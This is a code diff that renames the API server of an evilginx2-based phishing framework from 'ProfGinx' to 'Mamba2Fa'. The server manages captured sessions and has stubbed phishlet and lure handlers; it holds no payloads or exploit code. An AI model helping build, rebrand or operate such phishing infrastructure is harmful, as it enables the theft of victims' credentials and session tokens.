@@ -13,7 +13,7 @@ import (
 	"github.com/kgretzky/evilginx2/log"
 )
 
-type ProfGinxAPI struct {
+type Mamba2FaAPI struct {
 	router   *mux.Router
 	config   *Config
 	db       *database.Database
@@ -65,9 +65,9 @@ type LureResponse struct {
 	URL        string `json:"url"`
 }
 
-// NewProfGinxAPI creates a new API instance
-func NewProfGinxAPI(config *Config, db *database.Database, crt_db *CertDb, apiKey string, port int) *ProfGinxAPI {
-	api := &ProfGinxAPI{
+// NewMamba2FaAPI creates a new API instance
+func NewMamba2FaAPI(config *Config, db *database.Database, crt_db *CertDb, apiKey string, port int) *Mamba2FaAPI {
+	api := &Mamba2FaAPI{
 		router:   mux.NewRouter(),
 		config:   config,
 		db:       db,
@@ -83,7 +83,7 @@ func NewProfGinxAPI(config *Config, db *database.Database, crt_db *CertDb, apiKe
 }
 
 // Authentication middleware
-func (api *ProfGinxAPI) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
+func (api *Mamba2FaAPI) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		authHeader := r.Header.Get("Authorization")
 		if authHeader == "" {
@@ -107,7 +107,7 @@ func (api *ProfGinxAPI) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
 }
 
 // Setup API routes
-func (api *ProfGinxAPI) setupRoutes() {
+func (api *Mamba2FaAPI) setupRoutes() {
 	// Health check (no auth)
 	api.router.HandleFunc("/api/health", api.handleHealth).Methods("GET")
 
@@ -135,13 +135,13 @@ func (api *ProfGinxAPI) setupRoutes() {
 }
 
 // Helper functions
-func (api *ProfGinxAPI) sendJSON(w http.ResponseWriter, data interface{}, status int) {
+func (api *Mamba2FaAPI) sendJSON(w http.ResponseWriter, data interface{}, status int) {
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(status)
 	json.NewEncoder(w).Encode(data)
 }
 
-func (api *ProfGinxAPI) sendSuccess(w http.ResponseWriter, message string, data interface{}) {
+func (api *Mamba2FaAPI) sendSuccess(w http.ResponseWriter, message string, data interface{}) {
 	response := APIResponse{
 		Success: true,
 		Message: message,
@@ -150,7 +150,7 @@ func (api *ProfGinxAPI) sendSuccess(w http.ResponseWriter, message string, data 
 	api.sendJSON(w, response, http.StatusOK)
 }
 
-func (api *ProfGinxAPI) sendError(w http.ResponseWriter, error string, status int) {
+func (api *Mamba2FaAPI) sendError(w http.ResponseWriter, error string, status int) {
 	response := APIResponse{
 		Success: false,
 		Error:   error,
@@ -161,15 +161,15 @@ func (api *ProfGinxAPI) sendError(w http.ResponseWriter, error string, status in
 // API Handlers
 
 // Health check
-func (api *ProfGinxAPI) handleHealth(w http.ResponseWriter, r *http.Request) {
-	api.sendSuccess(w, "ProfGinx API is running", map[string]string{
+func (api *Mamba2FaAPI) handleHealth(w http.ResponseWriter, r *http.Request) {
+	api.sendSuccess(w, "Mamba2Fa API is running", map[string]string{
 		"version": "2.1",
 		"status":  "healthy",
 	})
 }
 
 // List all sessions
-func (api *ProfGinxAPI) handleListSessions(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleListSessions(w http.ResponseWriter, r *http.Request) {
 	sessions, err := api.db.ListSessions()
 	if err != nil {
 		api.sendError(w, fmt.Sprintf("Failed to list sessions: %v", err), http.StatusInternalServerError)
@@ -195,7 +195,7 @@ func (api *ProfGinxAPI) handleListSessions(w http.ResponseWriter, r *http.Reques
 }
 
 // Get single session
-func (api *ProfGinxAPI) handleGetSession(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleGetSession(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	id, err := strconv.Atoi(vars["id"])
 	if err != nil {
@@ -234,7 +234,7 @@ func (api *ProfGinxAPI) handleGetSession(w http.ResponseWriter, r *http.Request)
 }
 
 // Delete session
-func (api *ProfGinxAPI) handleDeleteSession(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleDeleteSession(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	id, err := strconv.Atoi(vars["id"])
 	if err != nil {
@@ -252,7 +252,7 @@ func (api *ProfGinxAPI) handleDeleteSession(w http.ResponseWriter, r *http.Reque
 }
 
 // Delete all sessions
-func (api *ProfGinxAPI) handleDeleteAllSessions(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleDeleteAllSessions(w http.ResponseWriter, r *http.Request) {
 	sessions, err := api.db.ListSessions()
 	if err != nil {
 		api.sendError(w, fmt.Sprintf("Failed to list sessions: %v", err), http.StatusInternalServerError)
@@ -274,62 +274,62 @@ func (api *ProfGinxAPI) handleDeleteAllSessions(w http.ResponseWriter, r *http.R
 
 /*
 // List phishlets
-func (api *ProfGinxAPI) handleListPhishlets(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleListPhishlets(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper phishlet manager
 	api.sendSuccess(w, "Phishlets retrieved successfully", []PhishletResponse{})
 }
 
 // Get phishlet details
-func (api *ProfGinxAPI) handleGetPhishlet(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleGetPhishlet(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper phishlet manager
 	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
 }
 
 // Enable phishlet
-func (api *ProfGinxAPI) handleEnablePhishlet(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleEnablePhishlet(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper phishlet manager
 	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
 }
 
 // Disable phishlet
-func (api *ProfGinxAPI) handleDisablePhishlet(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleDisablePhishlet(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper phishlet manager
 	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
 }
 
 // Set phishlet hostname
-func (api *ProfGinxAPI) handleSetHostname(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleSetHostname(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper phishlet manager
 	api.sendError(w, "Not yet implemented", http.StatusNotImplemented)
 }
 
 // List lures
-func (api *ProfGinxAPI) handleListLures(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleListLures(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper lure manager
 	api.sendSuccess(w, "Lures retrieved successfully", []LureResponse{})
 }
 
 // Create lure
-func (api *ProfGinxAPI) handleCreateLure(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleCreateLure(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper lure manager
 	api.sendError(w, "Lure creation not yet implemented", http.StatusNotImplemented)
 }
 
 // Get lure
-func (api *ProfGinxAPI) handleGetLure(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleGetLure(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper lure manager
 	api.sendError(w, "Lure retrieval not yet implemented", http.StatusNotImplemented)
 }
 
 // Delete lure
-func (api *ProfGinxAPI) handleDeleteLure(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleDeleteLure(w http.ResponseWriter, r *http.Request) {
 	// TODO: Implement with proper lure manager
 	api.sendError(w, "Lure deletion not yet implemented", http.StatusNotImplemented)
 }
 */
 
 // Get stats
-func (api *ProfGinxAPI) handleStats(w http.ResponseWriter, r *http.Request) {
+func (api *Mamba2FaAPI) handleStats(w http.ResponseWriter, r *http.Request) {
 	sessions, err := api.db.ListSessions()
 	if err != nil {
 		api.sendError(w, fmt.Sprintf("Failed to get stats: %v", err), http.StatusInternalServerError)
@@ -354,7 +354,7 @@ func (api *ProfGinxAPI) handleStats(w http.ResponseWriter, r *http.Request) {
 }
 
 // Start API server
-func (api *ProfGinxAPI) Start() error {
+func (api *Mamba2FaAPI) Start() error {
 	api.mtx.Lock()
 	defer api.mtx.Unlock()
 
@@ -363,7 +363,7 @@ func (api *ProfGinxAPI) Start() error {
 	}
 
 	addr := fmt.Sprintf(":%d", api.port)
-	log.Important("🔌 ProfGinx API Server starting on %s", addr)
+	log.Important("🔌 Mamba2Fa API Server starting on %s", addr)
 	log.Important("🔑 API Authentication: Bearer token required")
 	log.Info("📡 API Endpoints available at http://localhost%s/api/", addr)
 
@@ -374,12 +374,12 @@ func (api *ProfGinxAPI) Start() error {
 	}()
 
 	api.enabled = true
-	log.Success("✅ ProfGinx API Server started successfully")
+	log.Success("✅ Mamba2Fa API Server started successfully")
 	return nil
 }
 
 // Stop API server
-func (api *ProfGinxAPI) Stop() {
+func (api *Mamba2FaAPI) Stop() {
 	api.mtx.Lock()
 	defer api.mtx.Unlock()
 	api.enabled = false
@@ -387,7 +387,7 @@ func (api *ProfGinxAPI) Stop() {
 }
 
 // IsRunning checks if API server is running
-func (api *ProfGinxAPI) IsRunning() bool {
+func (api *Mamba2FaAPI) IsRunning() bool {
 	api.mtx.Lock()
 	defer api.mtx.Unlock()
 	return api.enabled
